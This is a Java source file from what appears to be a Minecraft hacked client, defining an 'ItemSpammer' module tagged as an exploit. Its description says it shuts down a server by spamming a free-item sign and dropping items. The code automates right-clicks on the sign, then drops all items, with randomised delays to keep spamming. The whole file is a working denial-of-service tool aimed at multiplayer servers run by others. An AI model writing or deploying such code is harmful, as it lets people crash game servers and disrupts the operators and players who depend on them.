package com.ngames.nclient.hack.hacks;

import com.ngames.nclient.NClient;
import com.ngames.nclient.baritone.BUtils;
import com.ngames.nclient.baritone.Baritone;
import com.ngames.nclient.baritone.SafeThread;
import com.ngames.nclient.hack.Category;
import com.ngames.nclient.hack.Hack;
import com.ngames.nclient.hack.NClientHack;
import com.ngames.nclient.hack.settings.SettingValue;
import net.minecraft.client.gui.inventory.GuiContainer;

@NClientHack(
   category = Category.EXPLOIT,
   description = "Shutdown server with dropping items from free item sign",
   name = "ItemSpammer",
   words = "ItemSpammer exploit shutdown crash killer server",
   keyBind = 0
)
public class ItemSpammer extends Hack {
   private final SettingValue minDelay = new SettingValue("MinDelay", 35.0F, 0.0F, 8.64E7F);
   private final SettingValue maxDelay = new SettingValue("MaxDelay", 40.0F, 0.0F, 8.64E7F);
   private final SettingValue dropMinDelay = new SettingValue("MinDropDelay", 5.0F, 0.0F, 8.64E7F);
   private final SettingValue dropMaxDelay = new SettingValue("MaxDropDelay", 8.0F, 0.0F, 8.64E7F);

   public ItemSpammer() {
      this.settings = Hack.addSettings(this);
   }

   public void onEnable() {
      super.onEnable();
      (new SafeThread(() -> {
         Baritone.rightClickMouse();

         while(!(NClient.MC.field_71462_r instanceof GuiContainer) && this.enabled) {
            while(NClient.MC.field_71441_e == null) {
               BUtils.sleep(10L);
            }

            BUtils.sleep((long)BUtils.randomInRange(this.minDelay.getValue(), this.maxDelay.getValue()), BUtils.randomInRange(0, 999999));
            Baritone.rightClickMouse();
         }

         if (this.dropMaxDelay.getValue() == 0.0F) {
            Baritone.dropAllItems();
         } else {
            Baritone.dropAllItems(this.dropMinDelay.getValue(), this.dropMaxDelay.getValue());
         }

         Baritone.closeInventory();

         while(NClient.MC.field_71462_r instanceof GuiContainer && this.enabled) {
            BUtils.sleep(10L);
         }

      }, this)).start();
   }
}
